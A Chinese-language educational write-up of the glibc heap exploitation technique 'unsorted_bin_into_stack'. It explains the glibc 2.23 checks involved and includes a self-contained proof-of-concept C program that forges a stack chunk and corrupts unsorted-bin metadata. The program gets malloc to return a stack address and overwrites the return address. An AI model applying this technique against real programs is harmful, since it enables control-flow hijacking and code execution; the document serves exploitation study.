# 漏洞利用文档：unsorted_bin_into_stack

## 攻击对象
- **堆元数据**：victim chunk（地址示例：0x602410）的size字段和bk指针。size字段被修改以绕过分配检查，bk指针被重定向到栈内存。
- **栈内存**：栈上伪造的chunk结构（地址示例：0x7fffffffe2f0），包括size字段和bk指针，用于欺骗malloc分配器返回栈地址。

## 利用过程
1. **分配和释放chunk**：分配两个chunk（victim和p1），释放victim chunk使其进入unsorted bin。
2. **伪造栈chunk**：在栈上创建一个伪造的chunk，设置size字段为0x110（匹配请求大小）和bk指针指向自身。
3. **内存破坏**：通过漏洞修改victim chunk的size为32（小于请求大小）和bk指针指向栈伪造chunk。
4. **触发分配**：调用malloc(0x100)，glibc分配器遍历unsorted bin，由于victim size不匹配，检查bk指向的伪造chunk，返回栈地址。
5. **控制流劫持**：在返回的栈地址处写入shellcode（如jackpot函数地址），覆盖返回地址，实现劫持。

## 利用条件
- **悬空指针或堆溢出**：程序存在内存破坏漏洞，允许修改已释放chunk的元数据（例如，通过use-after-free或堆溢出写）。
- **可控的栈内存**：攻击者能在栈上伪造chunk结构，并控制其内容。
- **分配大小匹配**：请求的malloc大小必须与伪造chunk的size字段匹配（这里为0x100），以通过分配器检查。

## 利用效果
- **任意地址分配**：malloc返回栈地址（示例：0x7fffffffe300），使堆分配重定向到栈。
- **控制流劫持**：通过在栈上写入数据（如函数指针），覆盖返回地址或关键变量，执行任意代码（这里跳转到jackpot函数）。

## 涉及缓解机制
在glibc的malloc实现中，unsorted bin处理涉及以下检查（基于glibc 2.23源码，`malloc/malloc.c`中的`_int_malloc`函数）：
- **Size检查**：chunk的size必须满足`2*SIZE_SZ <= size <= av->system_mem`（在x64上，SIZE_SZ=8，因此size至少16字节且小于system_mem）。伪代码：
  ```c
  if (chunk_size < MINSIZE || chunk_size > av->system_mem) {
      // 错误处理，可能中止
  }
  ```
- **bk指针验证**：在遍历unsorted bin时，bk指针应指向有效的chunk，但这里利用伪造chunk绕过，因为分配器仅检查size匹配而不严格验证地址有效性（除非额外保护如PIE或ASLR，但栈地址通常可写）。

实际源码片段（glibc 2.23, `_int_malloc` around line 3519）：
```c
while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av)) {
  bck = victim->bk;
  size = chunksize (victim);
  // 检查size
  if (__builtin_expect (size <= 2 * SIZE_SZ, 0)
      || __builtin_expect (size > av->system_mem, 0)) {
      // 错误处理
  }
  // ... 其他代码
}
```
本利用通过设置victim size为32（大于16）和伪造chunk size为0x110（小于system_mem）绕过检查。

## Proof of Concept
以下是漏洞利用原型源码，添加了中文注释解释关键步骤：

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>

void jackpot(){ printf("Nice jump d00d\n"); exit(0); } // 目标函数，用于控制流劫持

int main() {
    intptr_t stack_buffer[4] = {0}; // 栈上数组，用于伪造chunk

    printf("Allocating the victim chunk\n");
    intptr_t* victim = malloc(0x100); // 分配victim chunk，大小0x100

    printf("Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n");
    intptr_t* p1 = malloc(0x100); // 分配另一个chunk，防止top chunk合并

    printf("Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
    free(victim); // 释放victim，它进入unsorted bin

    printf("Create a fake chunk on the stack");
    printf("Set size for next allocation and the bk pointer to any writable address");
    stack_buffer[1] = 0x100 + 0x10; // 伪造chunk的size字段：0x110（0x100数据 + 0x10元数据）
    stack_buffer[3] = (intptr_t)stack_buffer; // 伪造chunk的bk指针指向自身，形成循环

    //------------VULNERABILITY-----------
    // 模拟漏洞：覆盖victim chunk的元数据
    printf("Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointer\n");
    printf("Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem\n");
    victim[-1] = 32; // 修改victim的size为32（原为0x111），使其小于请求大小，但大于16以绕过检查
    victim[1] = (intptr_t)stack_buffer; // 修改victim的bk指针指向栈伪造chunk
    //------------------------------------

    printf("Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
    char *p2 = malloc(0x100); // malloc请求0x100，返回栈地址（伪造chunk的数据区域）
    printf("malloc(0x100): %p\n", p2);

    intptr_t sc = (intptr_t)jackpot; // 获取jackpot函数地址，模拟shellcode
    memcpy((p2+40), &sc, 8); // 在返回的栈地址偏移40处写入地址，绕过栈保护（如canary），覆盖返回地址

    assert((long)__builtin_return_address(0) == (long)jackpot); // 验证返回地址被劫持
}
```

### 注释说明
- **栈伪造chunk**：`stack_buffer[1]`设置size为0x110，`stack_buffer[3]`设置bk指针，使分配器认为这是一个有效的free chunk。
- **内存破坏**：`victim[-1]`和`victim[1]`修改元数据，利用漏洞（如UAF）实现。
- **malloc触发**：调用`malloc(0x100)`时，glibc分配器检查unsorted bin，由于victim size不匹配，转而检查bk指向的伪造chunk，并返回栈地址。
- **控制流劫持**：`memcpy`写入jackpot地址到栈上，覆盖返回地址，导致函数跳转。